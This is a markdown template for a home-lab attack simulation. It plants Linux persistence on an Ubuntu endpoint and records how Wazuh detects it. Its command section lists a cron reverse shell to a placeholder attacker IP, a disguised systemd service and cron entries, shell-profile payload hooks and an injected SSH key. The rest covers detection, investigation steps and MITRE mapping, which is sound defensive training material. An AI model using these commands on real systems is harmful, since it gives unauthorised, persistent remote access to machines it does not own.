# 🔗 Attack 04 – Persistence Mechanism (Ubuntu Endpoint)

## Attack Overview

| Field | Details |
|---|---|
| **Attack Name** | Linux Persistence via Cron Job / Systemd Service |
| **Target** | Ubuntu Desktop 26.04 (UBUNTU-ENDPOINT) |
| **Attacker** | Kali Linux (192.168.x.x) |
| **MITRE Tactic** | Persistence |
| **MITRE Technique** | T1053.003 – Scheduled Task/Job: Cron |
| **Severity** | High |
| **Date Performed** | YYYY-MM-DD |

## Objective

To simulate adversary persistence on the Ubuntu endpoint by creating cron jobs, systemd services, and shell profile modifications — testing Wazuh's ability to detect persistence mechanisms on Linux systems.

## Attack Methodology

1. Establish initial access to the Ubuntu endpoint
2. Create cron job for periodic callback to attacker
3. Install malicious systemd service for boot persistence
4. Modify shell profiles for login-triggered execution
5. Document all detection and log evidence

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | `192.168.x.x` | Kali 2025.2 |
| UBUNTU-ENDPOINT | Target/Victim | `192.168.x.x` | Ubuntu Desktop 26.04 |
| Wazuh Server | SIEM/Monitor | `192.168.x.x` | Ubuntu Server 26.04 |

## Kali Commands

```bash
# After gaining access to the target

# === CRON JOB PERSISTENCE ===
# User crontab
crontab -e
# Add: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'

# System-wide cron
echo "*/5 * * * * root /tmp/.hidden_payload.sh" | sudo tee /etc/cron.d/system-update

# Cron directories
cp payload.sh /etc/cron.hourly/system-check
chmod +x /etc/cron.hourly/system-check

# === SYSTEMD SERVICE PERSISTENCE ===
sudo tee /etc/systemd/system/system-update.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/tmp/.hidden_payload.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable system-update.service
sudo systemctl start system-update.service

# === SHELL PROFILE PERSISTENCE ===
echo '/tmp/.hidden_payload.sh &' >> ~/.bashrc
echo '/tmp/.hidden_payload.sh &' >> ~/.profile

# === SSH AUTHORIZED KEYS ===
echo "<ATTACKER_PUBLIC_KEY>" >> ~/.ssh/authorized_keys
```

## Linux Logs Generated

**syslog:**
```
Jun  6 12:05:01 ubuntu-endpoint CRON[12345]: (root) CMD (/tmp/.hidden_payload.sh)
Jun  6 12:05:01 ubuntu-endpoint systemd[1]: Started System Update Service.
```

**auth.log:**
```
Jun  6 12:05:02 ubuntu-endpoint sshd[12346]: Accepted publickey for <user> from <KALI_IP>
```

**cron.log:**
```
Jun  6 12:05:01 ubuntu-endpoint cron[12345]: (*system*system-update) RELOAD (cron.d/system-update)
```

## Wazuh Alerts

| Alert ID | Rule ID | Description | Level | Timestamp |
|---|---|---|---|---|
| <!-- ID --> | <!-- Rule --> | Crontab modified | <!-- Level --> | <!-- Time --> |
| <!-- ID --> | <!-- Rule --> | New systemd service created | <!-- Level --> | <!-- Time --> |
| <!-- ID --> | <!-- Rule --> | authorized_keys modified | <!-- Level --> | <!-- Time --> |

```json
{
  "rule": {
    "id": "",
    "description": "File integrity monitoring - crontab modified",
    "level": 7
  },
  "syscheck": {
    "path": "/var/spool/cron/crontabs/<user>",
    "event": "modified"
  }
}
```

## Event IDs

| Wazuh Rule ID | Description | Level |
|---|---|---|
| 510 | File integrity checksum changed | 7 |
| 554 | File added to monitored directory | 7 |
| 550 | File integrity monitoring alert | 7 |

## Detection Process

1. Wazuh File Integrity Monitoring (FIM) detected crontab modification
2. Systemd service creation triggered file creation alert in `/etc/systemd/system/`
3. SSH authorized_keys modification detected by FIM
4. Cron execution logs showed unexpected command execution

## Investigation Steps

1. **Alert Triage:** Reviewed FIM alerts for crontab and systemd changes
2. **Cron Audit:** Listed all cron jobs (`crontab -l`, checked `/etc/cron.d/`, `/etc/cron.*`)
3. **Service Audit:** Reviewed systemd services for unauthorized entries
4. **Profile Review:** Checked `.bashrc`, `.profile`, `.bash_profile` for injected commands
5. **SSH Key Audit:** Verified authorized_keys for unauthorized entries
6. **Payload Analysis:** Examined payload scripts referenced by persistence mechanisms
7. **Verdict:** Confirmed multiple persistence mechanisms established

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Persistence |
| **Technique ID** | T1053.003 |
| **Technique Name** | Scheduled Task/Job: Cron |
| **Procedure** | Adversary created cron jobs and systemd services to maintain persistent access with periodic reverse shell callbacks |
| **Detection Opportunity** | Monitor crontab modifications via FIM; audit `/etc/cron.d/`, `/etc/systemd/system/`; detect new services with `systemctl list-unit-files` |

## Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | <!-- Finding --> | <!-- High --> | <!-- FIM alert --> |
| 2 | <!-- Finding --> | <!-- High --> | <!-- Cron log entry --> |

## Lessons Learned

- <!-- Wazuh FIM configuration for persistence directories -->
- <!-- Cron job auditing best practices -->
- <!-- Systemd service monitoring -->
- <!-- SSH key management and monitoring -->
- <!-- Importance of baseline configuration for detection -->

---

> 📌 **Status:** 📝 Template — Update with actual findings after performing the attack simulation.
